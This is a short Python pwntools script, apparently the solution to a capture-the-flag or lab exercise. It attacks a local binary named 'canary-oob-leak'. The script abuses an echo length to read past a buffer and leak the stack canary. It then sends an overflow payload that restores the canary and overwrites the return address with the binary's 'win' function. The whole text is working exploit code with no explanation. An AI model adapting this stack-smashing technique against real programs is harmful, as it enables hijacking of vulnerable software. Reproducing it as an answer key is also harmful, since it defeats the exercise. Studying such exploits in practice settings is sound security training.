from pwn import *

context.binary = ELF("./canary-oob-leak")

p = process("./canary-oob-leak")

p.sendafter(b"bytes to echo?\n", "80")

p.sendafter(b"name?", ("A").encode())

leak = p.recvn(87)
canary = u64(leak[79:])
print(hex(canary))

payload = b"A" * 72 + p64(canary) + b"A" * 8 + p64(context.binary.sym.win)

p.sendafter("message?\n", payload)

print(p.recvall().strip().decode())
